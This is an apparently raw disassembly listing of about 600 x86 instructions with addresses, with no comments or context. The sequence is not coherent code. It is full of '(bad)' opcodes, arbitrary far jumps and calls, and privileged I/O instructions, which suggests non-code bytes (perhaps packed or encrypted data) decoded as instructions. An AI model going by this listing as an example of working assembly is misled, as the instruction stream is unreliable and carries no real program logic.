  41d792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d793:	imul   esp,DWORD PTR [edi-0x2c],0x5acec3ad
  41d79a:	push   0xffffffd6
  41d79c:	cdq    
  41d79d:	mov    edx,0xdfd08d5
  41d7a2:	sahf   
  41d7a3:	adc    dl,BYTE PTR [edi-0x6c]
  41d7a6:	addr16 push edx
  41d7a8:	retf   0xc164
  41d7ab:	sub    di,0xffb6
  41d7af:	sub    bh,ah
  41d7b1:	lahf   
  41d7b2:	mov    ch,0x1
  41d7b4:	xchg   DWORD PTR [eax+0x2d9f121a],edx
  41d7ba:	jmp    0x41d7e1
  41d7bc:	jnp    0x41d82c
  41d7be:	stc    
  41d7bf:	mov    bh,0x97
  41d7c1:	and    DWORD PTR [ecx],esp
  41d7c3:	dec    esi
  41d7c4:	xchg   esi,eax
  41d7c5:	jp     0x41d78c
  41d7c7:	mov    ds:0xec8dddb4,al
  41d7cc:	pop    edi
  41d7cd:	arpl   WORD PTR [eax+0x6e39842e],bx
  41d7d3:	fcom   DWORD PTR [ecx-0x6e]
  41d7d6:	stos   BYTE PTR es:[edi],al
  41d7d7:	xor    BYTE PTR ds:0x6295f8ac,al
  41d7dd:	ror    DWORD PTR [edx],cl
  41d7df:	jbe    0x41d844
  41d7e1:	push   eax
  41d7e2:	sbb    dl,BYTE PTR [ebp+esi*4-0x5534ce17]
  41d7e9:	es jp  0x41d7cd
  41d7ec:	test   cl,dl
  41d7ee:	jmp    0x6b98:0x95cd1d93
  41d7f5:	test   al,0xc4
  41d7f7:	or     ch,dl
  41d7f9:	add    eax,0x7c11f69b
  41d7fe:	sub    esi,edi
  41d800:	test   DWORD PTR gs:[ebp+0x196756f8],ebx
  41d807:	jae    0x41d7de
  41d809:	mov    ds:0x2d910a2a,al
  41d80e:	mov    edx,DWORD PTR [eax+0x61]
  41d811:	aas    
  41d812:	inc    edi
  41d813:	ficom  DWORD PTR [eiz*2+0x1c86337b]
  41d81a:	int3   
  41d81b:	or     eax,0x4f834613
  41d820:	aaa    
  41d821:	xor    bh,cl
  41d823:	adc    DWORD PTR [ebx+0x52d0cf9a],0xfffffffc
  41d82a:	add    DWORD PTR [eax+edi*2],ebp
  41d82d:	(bad)  
  41d82e:	call   0xb7a7:0x6b6334a5
  41d835:	cmc    
  41d836:	xor    BYTE PTR [edi+eiz*2+0x71f62540],dh
  41d83d:	inc    ebp
  41d83e:	scas   al,BYTE PTR es:[edi]
  41d83f:	cmp    al,BYTE PTR [eax-0x4afe3a6d]
  41d845:	aas    
  41d846:	pop    edi
  41d847:	jbe    0x41d807
  41d849:	es pop edi
  41d84b:	mov    bl,0xe1
  41d84d:	or     DWORD PTR [eax-0x34],0xb
  41d851:	mov    eax,0xb3e2193c
  41d856:	push   edx
  41d857:	bound  edi,QWORD PTR [esi]
  41d859:	push   cs
  41d85a:	retf   
  41d85b:	jae    0x41d81b
  41d85d:	lea    ebp,[ecx-0x77]
  41d860:	add    BYTE PTR [edx+0x7e391c5b],0x1d
  41d867:	push   ebp
  41d868:	rol    ebp,1
  41d86a:	xchg   ebp,eax
  41d86b:	cmp    edi,edi
  41d86d:	sbb    ah,dh
  41d86f:	jmp    FWORD PTR [esi-0x2391a523]
  41d875:	jmp    0xad186e5d
  41d87a:	pusha  
  41d87b:	das    
  41d87c:	shr    BYTE PTR [ecx],1
  41d87e:	mov    edi,edx
  41d880:	xchg   esp,eax
  41d881:	push   ebp
  41d882:	pop    esp
  41d883:	out    0xb5,eax
  41d885:	inc    DWORD PTR [ebx]
  41d887:	push   ecx
  41d888:	cdq    
  41d889:	ja     0x41d8a9
  41d88b:	cdq    
  41d88c:	arpl   WORD PTR [eax-0x75527497],di
  41d892:	sub    BYTE PTR [ebp+0x2b06c58d],dh
  41d898:	push   edx
  41d899:	jg     0x41d878
  41d89b:	dec    edx
  41d89c:	pop    ecx
  41d89d:	cmp    al,0x87
  41d89f:	call   0x6da8:0xedf1df3b
  41d8a6:	mov    eax,ds:0x30de85a7
  41d8ab:	pop    edi
  41d8ac:	jle    0x41d8e3
  41d8ae:	xor    al,0x57
  41d8b0:	neg    edi
  41d8b2:	aam    0x4b
  41d8b4:	push   ss
  41d8b5:	push   ecx
  41d8b6:	sbb    al,0xb1
  41d8b8:	push   0x2976681e
  41d8bd:	jne    0x41d8d6
  41d8bf:	jnp    0x41d8ac
  41d8c1:	lods   eax,DWORD PTR ds:[esi]
  41d8c2:	lods   eax,DWORD PTR ds:[esi]
  41d8c3:	xor    DWORD PTR [ebp+0x2f3d81b5],eax
  41d8c9:	push   esp
  41d8ca:	pop    edi
  41d8cb:	cld    
  41d8cc:	mov    bh,0xde
  41d8ce:	(bad)  
  41d8cf:	inc    ebp
  41d8d0:	or     DWORD PTR [edi-0x17],esp
  41d8d3:	lods   eax,DWORD PTR ds:[esi]
  41d8d4:	pop    esp
  41d8d5:	inc    eax
  41d8d6:	xchg   esi,eax
  41d8d7:	fld    DWORD PTR [edx]
  41d8d9:	push   es
  41d8da:	add    eax,0x7e9a5a78
  41d8df:	into   
  41d8e0:	dec    BYTE PTR [ebx-0x3e]
  41d8e3:	xchg   ebp,eax
  41d8e4:	leave  
  41d8e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8e6:	bound  edx,QWORD PTR ds:0x762f418a
  41d8ec:	push   esi
  41d8ed:	(bad)
  41d8f0:	jle    0x41d894
  41d8f2:	out    0x14,al
  41d8f4:	inc    eax
  41d8f5:	pushf  
  41d8f6:	das    
  41d8f7:	or     edi,ecx
  41d8f9:	sahf   
  41d8fa:	adc    eax,0x4cbdf408
  41d8ff:	or     dl,BYTE PTR [edi]
  41d901:	push   0xffffffc4
  41d903:	rcl    BYTE PTR [ebp-0xb],0xec
  41d907:	daa    
  41d908:	pop    ebx
  41d909:	(bad)  
  41d90a:	sub    eax,0xa91d3f66
  41d90f:	outs   dx,DWORD PTR ds:[esi]
  41d910:	mov    DWORD PTR [edx],0xa268f626
  41d916:	or     eax,0xb0488f85
  41d91b:	in     al,dx
  41d91c:	loop   0x41d93c
  41d91e:	xchg   edi,eax
  41d91f:	jge    0x41d93b
  41d921:	pop    ecx
  41d922:	aad    0x5a
  41d924:	mov    ?,WORD PTR [esi]
  41d926:	(bad)  [edx+eiz*8]
  41d929:	cs add al,0x4e
  41d92c:	(bad)  [esi]
  41d92e:	shr    DWORD PTR [ebx],0xb1
  41d931:	adc    BYTE PTR [edi-0x20622bba],ch
  41d937:	aam    0x8d
  41d939:	mov    al,ds:0x58527fe3
  41d93e:	xor    edi,esp
  41d940:	pop    ebx
  41d941:	mov    WORD PTR [ecx],cs
  41d943:	out    dx,eax
  41d944:	xor    eax,0xe1c8348
  41d949:	fadd   st(6),st
  41d94b:	mov    BYTE PTR [ecx+ebx*2+0x35745454],dh
  41d952:	push   ebp
  41d953:	pop    ecx
  41d954:	sti    
  41d955:	and    eax,0xf1d74bcf
  41d95a:	popf   
  41d95b:	mov    esi,0xb8a2770d
  41d960:	mov    bl,0xa7
  41d962:	inc    ecx
  41d963:	push   cs
  41d964:	mov    bh,0x76
  41d966:	retf   0xd518
  41d969:	js     0x41d8fa
  41d96b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d96c:	pop    ebx
  41d96d:	add    cl,ah
  41d96f:	inc    edx
  41d970:	xchg   BYTE PTR [eax+0x15],ch
  41d973:	jmp    0x566b:0x12f9aabd
  41d97a:	dec    esi
  41d97b:	stc    
  41d97c:	sbb    cl,BYTE PTR [ebx]
  41d97e:	sub    BYTE PTR [edx+0x63],ah
  41d981:	ret    
  41d982:	out    0x28,al
  41d984:	push   edx
  41d985:	lds    ebx,FWORD PTR [eax+esi*4]
  41d988:	add    eax,0xc8ad57a6
  41d98d:	fisttp QWORD PTR [esi]
  41d98f:	(bad)  
  41d990:	jnp    0x41da05
  41d992:	push   edi
  41d993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d994:	dec    ecx
  41d995:	sub    al,0x67
  41d997:	xor    bl,cl
  41d999:	jmp    0x41d9d5
  41d99b:	mov    ecx,0x43b02214
  41d9a0:	jmp    DWORD PTR [esp-0x16]
  41d9a4:	push   0xfe17c732
  41d9a9:	xchg   edi,eax
  41d9aa:	mov    esi,0xd2bcd1b9
  41d9af:	loop   0x41da0c
  41d9b1:	mov    al,ds:0x9ff91d5b
  41d9b6:	mov    bh,0xd3
  41d9b8:	lods   eax,DWORD PTR ds:[esi]
  41d9b9:	aad    0x69
  41d9bb:	pusha  
  41d9bc:	add    al,BYTE PTR ds:[edi]
  41d9bf:	(bad)  
  41d9c0:	fsub   QWORD PTR [ecx]
  41d9c2:	mov    dl,0x40
  41d9c4:	aas    
  41d9c5:	icebp  
  41d9c6:	mov    eax,edi
  41d9c8:	pop    edi
  41d9c9:	sbb    bl,BYTE PTR [esi+0x4a31f7b5]
  41d9cf:	sbb    BYTE PTR [ebp+0x15b38e2d],cl
  41d9d5:	sub    al,0x87
  41d9d7:	ja     0x41d97b
  41d9d9:	ds (bad) 
  41d9db:	fidiv  WORD PTR [edx+ecx*1+0x26]
  41d9df:	cld    
  41d9e0:	xor    BYTE PTR [ebp-0x63c8ea58],al
  41d9e6:	adc    ebp,DWORD PTR [eax-0x6b63c2a1]
  41d9ec:	icebp  
  41d9ed:	cmp    bh,BYTE PTR [ecx+0x6203b922]
  41d9f3:	fs dec ecx
  41d9f5:	mov    dh,0xcc
  41d9f7:	div    DWORD PTR [edx-0x4a32f895]
  41d9fd:	cmp    BYTE PTR [esi],bh
  41d9ff:	fcomip st,st(0)
  41da01:	imul   edx,esp,0xfffffff1
  41da04:	pop    es
  41da05:	jp     0x41d9e1
  41da07:	cdq    
  41da08:	call   0x6cb6:0x7b0a9472
  41da0f:	dec    edi
  41da10:	rol    ebp,cl
  41da12:	lea    edx,[edx+eiz*8]
  41da15:	aaa    
  41da16:	mov    esp,0x9e1ea1f5
  41da1b:	mov    dh,0x8a
  41da1d:	(bad)  
  41da1e:	fisub  DWORD PTR [ebx+0x3548da0a]
  41da24:	xor    al,0x9e
  41da26:	cmp    DWORD PTR [eax+0x14c4ae4d],esp
  41da2c:	inc    edi
  41da2d:	add    eax,0xfeec49b
  41da32:	jg     0x41da05
  41da34:	pop    edx
  41da35:	jo     0x41d9f6
  41da37:	aaa    
  41da38:	inc    ebx
  41da39:	jmp    0xa0c9:0xbfab036f
  41da40:	test   DWORD PTR [eax-0x4],eax
  41da43:	dec    ebx
  41da44:	das    
  41da45:	cmc    
  41da46:	stos   BYTE PTR es:[edi],al
  41da47:	mov    ah,0x59
  41da49:	bound  ebx,QWORD PTR [edx]
  41da4b:	jmp    0x93c77abb
  41da50:	dec    esi
  41da51:	sub    bl,BYTE PTR [ebp-0x735d916a]
  41da57:	push   edx
  41da58:	or     ebx,DWORD PTR [ebp-0x20db565e]
  41da5e:	sub    al,0xa7
  41da60:	fimul  DWORD PTR [ebp+0x20]
  41da63:	addr16 pop es
  41da65:	nop
  41da66:	jg     0x41da11
  41da68:	lahf   
  41da69:	xor    eax,0x72a891fc
  41da6e:	call   0xfb534bf4
  41da73:	nop
  41da74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da75:	inc    ebx
  41da76:	jecxz  0x41da75
  41da78:	repz inc esp
  41da7a:	outs   dx,BYTE PTR ds:[esi]
  41da7b:	das    
  41da7c:	dec    ecx
  41da7d:	jbe    0x41daac
  41da7f:	or     DWORD PTR [esi-0x6cc8d839],esi
  41da85:	jmp    0x9f229649
  41da8a:	sub    al,0x51
  41da8c:	cwde   
  41da8d:	xchg   BYTE PTR ss:[ecx-0x3f],dh
  41da91:	sub    eax,0x436261a7
  41da96:	and    DWORD PTR [eax+0xf64f000],ecx
  41da9c:	out    dx,al
  41da9d:	jne    0x41daaf
  41da9f:	xchg   ecx,eax
  41daa0:	or     BYTE PTR [ecx+0x6aa5e9bc],ch
  41daa6:	jecxz  0x41da58
  41daa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daa9:	lods   eax,DWORD PTR ds:[esi]
  41daaa:	sar    BYTE PTR [eax+0x31],cl
  41daad:	push   0x2a
  41daaf:	fsubr  st(5),st
  41dab1:	mov    eax,ds:0x6b3a25d6
  41dab6:	push   edi
  41dab7:	scas   al,BYTE PTR es:[edi]
  41dab8:	adc    BYTE PTR [ecx+0x6b3457b4],ch
  41dabe:	push   ebp
  41dabf:	mov    dh,ah
  41dac1:	int    0xd6
  41dac3:	or     DWORD PTR ds:0xfa8f6c58,edi
  41dac9:	in     al,dx
  41daca:	lahf   
  41dacb:	and    eax,DWORD PTR [edi+0x2b]
  41dace:	pop    edx
  41dacf:	or     al,0xee
  41dad1:	mov    edi,0x8ceeb8d8
  41dad6:	std    
  41dad7:	pop    eax
  41dad8:	into   
  41dad9:	jmp    DWORD PTR [esi-0x7990c962]
  41dadf:	and    dl,BYTE PTR [edi+0x448495d0]
  41dae5:	(bad)  
  41dae6:	out    dx,al
  41dae7:	dec    DWORD PTR [ebx+0x643a4709]
  41daed:	jmp    0xc3f1:0xce0c8621
  41daf4:	hlt    
  41daf5:	mov    esi,DWORD PTR [esi-0x4a]
  41daf8:	out    0x38,eax
  41dafa:	js     0x41daf5
  41dafc:	mov    bh,0xfa
  41dafe:	dec    BYTE PTR [edx-0x10]
  41db01:	into   
  41db02:	mov    al,0x32
  41db04:	add    BYTE PTR ds:0x81ff94bf,dh
  41db0a:	lock (bad) [ebx]
  41db0d:	mov    eax,0xc4eb7d9c
  41db12:	in     al,dx
  41db13:	jl     0x41db67
  41db15:	loopne 0x41da9c
  41db17:	hlt    
  41db18:	rcr    ah,0xa
  41db1b:	xchg   esp,eax
  41db1c:	cmp    DWORD PTR [edx],eax
  41db1e:	inc    edx
  41db1f:	ss pop ss
  41db21:	sbb    al,0xba
  41db23:	xor    BYTE PTR [edi+ebx*2-0x1f159484],bl
  41db2a:	push   0x5e504da2
  41db2f:	sar    DWORD PTR [ebx],cl
  41db31:	lahf   
  41db32:	ror    BYTE PTR [edx+0x25389af0],0x91
  41db39:	mov    ds:0xdf019d20,al
  41db3e:	int    0xcd
  41db40:	xchg   DWORD PTR [esi+0x54],ebp
  41db43:	push   0xffffffa7
  41db45:	push   0xe2147d3a
  41db4a:	into   
  41db4b:	aad    0x8b
  41db4d:	int    0xb9
  41db4f:	enter  0xf725,0xb3
  41db53:	cs mov ebx,gs
  41db56:	lea    edx,[ecx]
  41db58:	and    DWORD PTR ds:0xb62536f0,0xffffffdc
  41db5f:	xchg   edi,eax
  41db60:	fcmovnu st,st(0)
  41db62:	arpl   dx,dx
  41db64:	add    dl,BYTE PTR [ebx+0x3c]
  41db67:	fmulp  st(4),st
  41db69:	mov    dl,0x75
  41db6b:	imul   esi,DWORD PTR [edi+0x2c],0x98869f54
  41db72:	(bad)  
  41db73:	fidiv  DWORD PTR [ebp+edi*4+0x285116f2]
  41db7a:	pop    ss
  41db7b:	pop    eax
  41db7c:	mov    dl,0xd6
  41db7e:	inc    ebp
  41db7f:	in     al,dx
  41db80:	jg     0x41db6e
  41db82:	mov    edi,0xdc340371
  41db87:	dec    ecx
  41db88:	sar    bl,cl
  41db8a:	and    ebp,ebp
  41db8c:	cmp    al,0xa0
  41db8e:	sti    
  41db8f:	sti    
  41db90:	ds pop esp
  41db92:	inc    edx
  41db93:	lods   al,BYTE PTR ds:[esi]
  41db94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db95:	add    esp,DWORD PTR [ecx+0x57]
  41db98:	aas    
  41db99:	push   ss
  41db9a:	test   BYTE PTR [edi+edi*4+0x26],ch
  41db9e:	gs inc esp
  41dba0:	and    ebp,DWORD PTR [ebx+0x50]
  41dba3:	js     0x41dba2
  41dba5:	xchg   esp,eax
  41dba6:	push   0x2c
  41dba8:	aad    0x71
  41dbaa:	aad    0x1c
  41dbac:	and    edi,DWORD PTR [ecx+0x54748873]
  41dbb2:	lea    edx,[edi+0x6f1fa363]
  41dbb8:	jbe    0x41db86
  41dbba:	data16 jg 0x41db9a
  41dbbd:	dec    eax
  41dbbe:	nop
  41dbbf:	push   ebp
  41dbc0:	jne    0x41dbfa
  41dbc2:	add    eax,edi
  41dbc4:	fs daa 
  41dbc6:	jne    0x41db7c
  41dbc8:	shl    DWORD PTR [eax],1
  41dbca:	mov    esi,0x61283627
  41dbcf:	dec    ecx
  41dbd0:	sar    BYTE PTR [ebx+0x21],cl
  41dbd3:	jmp    0xa884:0xc59cbd05
  41dbda:	push   esi
  41dbdb:	jo     0x41dc0f
  41dbdd:	inc    ebp
  41dbde:	mov    ss,WORD PTR [edi-0x1d]
  41dbe1:	mov    esi,?
  41dbe3:	add    ecx,ecx
  41dbe5:	lock cmp BYTE PTR [edi-0x7b],cl
  41dbe9:	pop    eax
  41dbea:	push   es
  41dbeb:	push   edi
  41dbec:	mov    edx,0xf7899c20
  41dbf1:	push   edi
  41dbf2:	dec    ebp
  41dbf3:	test   eax,0x613b2b6f
  41dbf8:	and    BYTE PTR [esp+ecx*1+0x3ecf5ad],dl
  41dbff:	mov    edx,0x3bf4598a
  41dc04:	popa   
  41dc05:	xchg   edi,eax
  41dc06:	sub    eax,DWORD PTR [esi+edx*2-0x1c]
  41dc0a:	shl    al,1
  41dc0c:	push   ds
  41dc0d:	popa   
  41dc0e:	push   ss
  41dc0f:	mov    edx,DWORD PTR [edx-0x2d]
  41dc12:	push   cs
  41dc13:	(bad)  
  41dc15:	loope  0x41dc3d
  41dc17:	xor    ah,dl
  41dc19:	inc    ecx
  41dc1a:	psubw  mm6,QWORD PTR [esi]
  41dc1d:	std    
  41dc1e:	outs   dx,DWORD PTR ds:[esi]
  41dc1f:	dec    ebx
  41dc20:	dec    ebx
  41dc21:	or     DWORD PTR [ebp+0x33],edx
  41dc24:	stc    
  41dc25:	cdq    
  41dc26:	stc    
  41dc27:	xor    BYTE PTR [ebx+0x41],0xa3
  41dc2b:	jno    0x41dcac
  41dc2d:	cli    
  41dc2e:	sbb    eax,0xf5a87b31
  41dc33:	retf   
  41dc34:	dec    esp
  41dc35:	test   eax,0x40b4dbdb
  41dc3a:	or     eax,0xceaa728f
  41dc3f:	aam    0x30
  41dc41:	dec    edx
  41dc42:	or     BYTE PTR ds:0x2197be96,0x4
  41dc49:	adc    eax,0x1887908f
  41dc4e:	or     BYTE PTR [ebp+0x6900ba67],ch
  41dc54:	int3   
  41dc55:	xor    DWORD PTR [edi+ebp*1+0x6b],ecx
  41dc59:	jb     0x41dcb0
  41dc5b:	fimul  WORD PTR [eax]
  41dc5d:	call   0x5546820
  41dc62:	iret   
  41dc63:	hlt    
  41dc64:	jmp    0x41dc4d
  41dc66:	pop    edx
  41dc67:	cmp    al,0xeb
  41dc69:	push   ss
  41dc6a:	mov    edi,0x40cf992f
  41dc6f:	imul   ebx,DWORD PTR [ebp+0x5e0037fb],0xe6f2a590
  41dc79:	sub    al,0xd1
  41dc7b:	jo     0x41dc1f
  41dc7d:	retf   
  41dc7e:	sub    ebp,ebx
  41dc80:	inc    ebx
  41dc81:	sub    cl,cl
  41dc83:	es inc esi
  41dc85:	out    0xab,eax
  41dc87:	int    0xe3
  41dc89:	and    eax,0x5f28edc1
  41dc8e:	iret   
  41dc8f:	sbb    cl,BYTE PTR [ebx-0x49589d5a]
  41dc95:	jnp    0x41dc7e
  41dc97:	out    dx,eax
  41dc98:	mov    bl,0x97
  41dc9a:	sub    eax,DWORD PTR [ebx-0x70b5d40d]
  41dca0:	out    0xd7,eax
  41dca2:	cmc    
  41dca3:	fisttp DWORD PTR [edx-0x34665c04]
  41dca9:	scas   al,BYTE PTR es:[edi]
  41dcaa:	aaa    
  41dcab:	rol    BYTE PTR [ebx+ecx*1-0x19],0xe0
  41dcb0:	call   0xf046:0x5f586a79
  41dcb7:	retf   
  41dcb8:	sbb    cl,ch
  41dcba:	mov    esi,0xa21514bf
  41dcbf:	or     ebp,DWORD PTR [ecx]
  41dcc1:	cmp    DWORD PTR [ebp+0x14],ebx
  41dcc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcc5:	xchg   edx,eax
  41dcc6:	xor    edi,esi
  41dcc8:	hlt    
  41dcc9:	mov    ebp,0x39d7fde7
  41dcce:	sbb    ebx,esp
  41dcd0:	stc    
  41dcd1:	push   ebx
  41dcd2:	cld    
  41dcd3:	test   BYTE PTR [ecx-0x38e0d879],al
  41dcd9:	and    al,0x2e
  41dcdb:	pusha  
  41dcdc:	cwde   
  41dcdd:	cmp    DWORD PTR [edx],ebx
  41dcdf:	cwde   
  41dce0:	jns    0x41dd5c
  41dce2:	mov    edi,DWORD PTR [edi]
  41dce4:	sub    eax,0x31596f2a
  41dce9:	aas    
  41dcea:	sar    BYTE PTR [esi],0xfb
  41dced:	in     al,0x3b
  41dcef:	or     BYTE PTR [edx],dh
  41dcf1:	pushf  
  41dcf2:	mov    eax,0x66802fb0
  41dcf7:	lahf   
  41dcf8:	pop    esp
  41dcf9:	mov    DWORD PTR [edx+0x19c6451e],edi
  41dcff:	add    ch,BYTE PTR [edi+0x4e]
  41dd02:	mov    edx,0x766a2336
  41dd07:	shl    BYTE PTR [ebx-0x7ae6c809],cl
  41dd0d:	push   ecx
  41dd0e:	push   0xe41b165f
  41dd13:	jle    0x41dd56
  41dd15:	sbb    esi,ebx
  41dd17:	shl    bh,0xd1
  41dd1a:	pusha  
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	iret   
  41dd1d:	in     eax,0x1a
  41dd1f:	in     eax,dx
  41dd20:	xchg   DWORD PTR [ebx],ebp
  41dd22:	arpl   WORD PTR [ecx+ebx*2-0x53],bp
  41dd26:	cmp    DWORD PTR [esi],esp
  41dd28:	bound  edx,QWORD PTR [eax+eax*8+0x463c9fea]
  41dd2f:	mov    ebx,0xaf73aab3
  41dd34:	jg     0x41dd70
  41dd36:	mov    al,0x55
  41dd38:	pop    ebx
  41dd39:	outs   dx,DWORD PTR ds:[esi]
  41dd3a:	or     DWORD PTR [esi-0x80],edi
  41dd3d:	cmp    al,0x3c
  41dd3f:	fimul  WORD PTR [eax+0x50]
  41dd42:	mov    dh,0xac
  41dd44:	sub    al,0x3a
  41dd46:	ss in  eax,dx
  41dd48:	test   esp,0x527482b8
  41dd4e:	adc    ecx,DWORD PTR [edx+0x39]
  41dd51:	retf   
  41dd52:	imul   ebx,DWORD PTR [ebp-0x641dff32],0x16
  41dd59:	push   ds
  41dd5a:	push   ebx
  41dd5b:	ret    
  41dd5c:	xchg   ecx,eax
  41dd5d:	dec    ebp
  41dd5e:	cld    
  41dd5f:	mov    esi,0xb2bb9528
  41dd64:	mov    esp,0x2b92c11
  41dd69:	cmp    eax,0x86cf020a
  41dd6e:	fnsave [edi-0x78]
  41dd71:	mov    WORD PTR [edx],fs
  41dd73:	add    BYTE PTR [esi],dh
  41dd75:	int3   
  41dd76:	sti    
  41dd77:	inc    esp
  41dd78:	es adc eax,0x7b3d13b5
  41dd7e:	jmp    0xc72f:0x935c0378
  41dd85:	cmp    ah,BYTE PTR [ecx-0x1b]
  41dd88:	jmp    0x4f4b2f1
  41dd8d:	outs   dx,BYTE PTR ds:[esi]
  41dd8e:	xor    DWORD PTR [ecx],ebp
  41dd90:	outs   dx,DWORD PTR ds:[esi]
  41dd91:	pop    DWORD PTR [eax+0x3cd7e7b9]
  41dd97:	sahf   
  41dd98:	xchg   ebp,eax
  41dd99:	aaa    
  41dd9a:	ins    DWORD PTR es:[edi],dx
  41dd9b:	enter  0x8082,0x75
  41dd9f:	xchg   edx,eax
  41dda0:	dec    ebp
  41dda1:	ficom  DWORD PTR [ebp-0x2109cc31]
  41dda7:	sti    
  41dda8:	jecxz  0x41ddee
  41ddaa:	xor    BYTE PTR [edi],dh
  41ddac:	outs   dx,DWORD PTR ds:[esi]
  41ddad:	gs jge 0x41ddae
  41ddb0:	xor    cl,0xdf
  41ddb3:	mov    ebp,0x48fee2e2
  41ddb8:	pop    ss
  41ddb9:	cmp    ebp,0xbcfccfc9
  41ddbf:	mov    bl,0xdc
  41ddc1:	jmp    0x626273a7
  41ddc6:	aam    0x5
  41ddc8:	loope  0x41ddbc
  41ddca:	pop    esp
  41ddcb:	ins    DWORD PTR es:[edi],dx
  41ddcc:	xchg   ebx,eax
  41ddcd:	adc    ax,0xd69
  41ddd1:	inc    ebx
  41ddd2:	jno    0x41de05
  41ddd4:	inc    esi
  41ddd5:	rcl    DWORD PTR [ecx+ecx*4-0x2e5cfeba],0xb1
  41dddd:	jns    0x41de0a
  41dddf:	mov    al,0xca
  41dde1:	inc    edi
  41dde2:	dec    esp
  41dde3:	call   0x2576:0xd0597191
  41ddea:	cmp    esp,DWORD PTR [edi]
  41ddec:	mov    ds:0xb2ef9ede,al
  41ddf1:	inc    esp
  41ddf2:	jecxz  0x41de31
  41ddf4:	adc    ch,BYTE PTR [ebx-0x68fa9495]
  41ddfa:	mov    bl,0xf3
  41ddfc:	(bad)  
  41ddfd:	arpl   WORD PTR [ebp-0x3cc7d021],dx
  41de03:	mov    al,ds:0x7d96a227
  41de08:	xor    al,0x7
  41de0a:	popf   
  41de0b:	pop    edx
  41de0c:	xor    ebx,DWORD PTR [eax-0x41]
  41de0f:	shl    BYTE PTR [esi],0xfd
  41de12:	mov    ds:0x638f46f7,al
  41de17:	or     bl,BYTE PTR [ebp-0x2a551c85]
  41de1d:	add    BYTE PTR [ebx-0x1e],0xdf
  41de21:	test   eax,0x9c27a778
  41de26:	xor    al,0xce
  41de28:	mov    esp,0x969a512d
  41de2d:	test   DWORD PTR [eax+0x335e151a],0xe7ad2c68
  41de37:	jle    0x41ddf7
  41de39:	cmp    eax,0xc09338bd
  41de3e:	das    
  41de3f:	int3   
  41de40:	sahf   
  41de41:	lahf   
  41de42:	dec    edx
  41de43:	dec    ebx
  41de44:	or     esi,esi
  41de46:	sub    esi,DWORD PTR [edx]
  41de48:	mov    al,dl
  41de4a:	adc    bh,BYTE PTR [edx+0x23]
  41de4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de4e:	mov    ch,0x10
  41de50:	pfsubr mm0,QWORD PTR [ebp-0x72e54162]
  41de58:	dec    ebp
  41de59:	add    dh,dh
  41de5b:	push   ebx
  41de5c:	ja     0x41ddfc
  41de5e:	inc    esp
  41de5f:	loope  0x41de57
  41de61:	rol    DWORD PTR [edx-0x603b61d2],1
  41de67:	mov    ch,0x1f
  41de69:	xchg   BYTE PTR [edx+0x75],ch
  41de6c:	sbb    cl,BYTE PTR [esi+0x77651eca]
  41de72:	and    bl,BYTE PTR [eax]
  41de74:	xchg   esp,eax
  41de75:	lahf   
  41de76:	pusha  
  41de77:	and    al,0xb8
  41de79:	jns    0x41ded0
  41de7b:	adc    DWORD PTR [eax-0x5],0xffffffe5
  41de7f:	test   DWORD PTR [eax],edi
  41de81:	sbb    al,0xea
  41de83:	xchg   esp,eax
  41de84:	ret    0x15ce
  41de87:	jns    0x41de4f
  41de89:	xor    bl,BYTE PTR [ecx]
  41de8b:	ret    0x6677
  41de8e:	pop    edi
  41de8f:	lock leave 
  41de91:	nop
  41de92:	sub    eax,0x19620eb0
  41de97:	popf   
  41de98:	push   ds
  41de99:	push   es
  41de9a:	dec    esp
  41de9b:	ins    BYTE PTR es:[edi],dx
  41de9c:	xchg   ebp,eax
  41de9d:	lea    ecx,[eax]
  41de9f:	jmp    0x3cf7e22d
  41dea4:	leave  
  41dea5:	repnz mov ch,0x78
  41dea8:	add    BYTE PTR [ebp+0x59],ah
  41deab:	dec    eax
  41deac:	pop    ebp
  41dead:	push   DWORD PTR [ebp-0x6b]
  41deb0:	jecxz  0x41dec0
  41deb2:	ja     0x41de4e
  41deb4:	in     al,0x1a
  41deb6:	xlat   BYTE PTR ds:[ebx]
  41deb7:	es xor eax,0xe976cca4
  41debd:	jns    0x41def2
  41debf:	xchg   ebp,eax
  41dec0:	push   es
  41dec1:	pop    ss
  41dec2:	add    al,0x1b
  41dec4:	mov    bh,0x56
  41dec6:	add    bl,BYTE PTR [edx-0x735094d6]
  41decc:	mov    ds:0xeacff1f2,al
  41ded1:	bound  eax,QWORD PTR [ebx]
  41ded3:	test   esi,ebp
  41ded5:	test   al,0x94
  41ded7:	xrelease mov BYTE PTR [eax],dl
  41deda:	out    dx,eax
  41dedb:	mov    ecx,0xf1a1d340
  41dee0:	popf   
  41dee1:	add    al,0xb2
  41dee3:	popf   
  41dee4:	pop    ebp
  41dee5:	push   es
  41dee6:	rcl    BYTE PTR [ebx+0x28],0x82
  41deea:	jb     0x41debe
  41deec:	retf   
  41deed:	imul   esp,DWORD PTR [ecx-0x432c98e2],0xffffffce
  41def4:	pop    ebx
  41def5:	cld    
  41def6:	ds repz jns 0x41df1c
  41defa:	fstp   TBYTE PTR [eax-0x3dfb6d2f]
  41df00:	add    BYTE PTR [eax+0x1e99f127],bh
  41df06:	(bad)  
  41df07:	adc    eax,DWORD PTR [edi+0x6]
  41df0a:	stc    
  41df0b:	iret   
  41df0c:	jae    0x41deec
  41df0e:	mov    BYTE PTR [edx+0x54245f17],dh
  41df14:	jnp    0x41df5c
  41df16:	shl    DWORD PTR [edx],1
  41df18:	sub    al,BYTE PTR [esi+0x6f]
  41df1b:	stc    
  41df1c:	cmc    
  41df1d:	or     ah,BYTE PTR [eax-0x6f364acf]
  41df23:	ja     0x41df3c
  41df25:	jo     0x41df1d
  41df27:	xchg   esp,eax
  41df28:	clc    
  41df29:	push   ebp
  41df2a:	push   es
  41df2b:	or     al,0x1c
  41df2d:	cwde   
  41df2e:	out    dx,eax
  41df2f:	loope  0x41dfaf
  41df31:	xchg   ebx,eax
  41df32:	cs and esi,ebp
